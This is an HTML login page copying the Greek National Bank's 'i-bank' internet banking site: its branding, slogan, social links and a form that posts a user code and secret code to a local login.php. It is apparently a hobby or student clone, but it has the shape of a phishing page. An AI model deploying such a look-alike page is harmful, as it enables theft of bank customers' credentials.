
<!DOCTYPE html>
 <html>
  <head>
    <meta charset="UTF-08" />
    <meta name="viewport" content="width=width-device,initial-scale=1.0" />
    <meta name="keywords" content="i-bank,Ethniki Trapeza,web banking,Εθνικη Τραπεζα,National bank" />
    <link rel="stylesheet" type="text/css" href="Login.css"/>
    <title>i bank Internet Banking</title>
</head>
 <body>
   <script src="Js/Dt.js"></script>
  <ul id="menu_1">
     <li><a href="index.php"><img id="Image_1" src="images/Edit.png" alt="Σημα της Εθνικης τραπεζας"></a></img></li>
     <li id="smg"><p id="text">Ηλεκτρονική Υπηρεσία της Εθνικής Τράπεζας</p></li>
     <li id="mkg"><img id="Image_2" src="images/download.png"  alt="Nbg group"></img></li>
     <li><p id="demo"></p></li>
     <li><p id="demo_1">Be Finnovative</p></li>
     <li><p id="demo_2">Μέλος της Ελληνικής Ένωσης Τραπεζών</p></li>
   </div>
  </ul>
    <div class="Login">
      <form action="login.php" method="post">
        <label for("passwd")>Κωδικός Χρήστη</label><br><input type="password" name="passwd" placeholder="Ο κωδικος σου" required/>
        <br><label for("passwd_1")>Μυστικός Κωδικός</label><br><input type="password" name="passwd_1" placeholder="Ο μυστικος κωδικος σου"/>
        <br><input type="submit" id="Subm" value="Συνδεση"/>
      </form>
    </div>
 <p id="slide">Καλως ηρθατε στο i-bank</p>
  <ul id="menu">
     <li><a href="Info.html">Γενικές πληροφορίες</a></li>
     <li><a href="Constructions.html">Εγχειρίδια-Οδηγίες</a></li>
     <li><a href="Contact.html">Email</a></li>
  </ul>
  <img src="images/i-bank.jpg"></img>
  <div id="News">
    <h3>Μεγάλη προσοχή!</h3><ul>
      <li>Μην απαντάτε ποτέ σε email ή μηνύματα που σας ζητάνε προσωπικά σας στοιχεία(κωδικούς κτλ.).</li>
      <li>Θα ήταν καλό τους κωδικούς να τους γνωρίζετε ΜΟΝΟ εσείς.</li>
      <li>Η τράπεζα δεν θα σας ζητήσει ποτέ στοιχεία και δεν φέρνει καμία ευθυνή(ποινική) για τυχόν απώλεια τους</li>
    </ul>
  </div>
  <div id="Social_media">
    <ul>
      <li><a href="https://www.linkedin.com/company/national-bank-of-greece"><img src="images/in.png" alt="Our LinkedIn"></img></a></li>
            <li><a href="https://www.youtube.com/channel/UCAwPZIUpdP3aIQlfw4bETLQ"><img src="images/yt.png" alt="Our Youtube channel"></img></a></li>
      <li><a href="https://www.facebook.com/ibanknbg"><img src="images/fb.png" alt="Our Facebook"></img></a></li>
      <li><a href="https://twitter.com/ibanknbg"><img src="images/twitter.png" alt="Our Twitter"></img></a></li>

    </ul>
  </div>
  <footer><marquee behavior="scroll"><b>Διασφαλίστε τωρα τις επιταγες σας με την ηλεκτρονική θυρίδα επιταγών(e-chequebox) με μια μικρη ετησια προμηθεια.</b></marquee>
  <br><br>Copyright &copy;Εθνική Τράπεζα 2011-<?php echo date('Y');?></footer>
 </body>
</html>
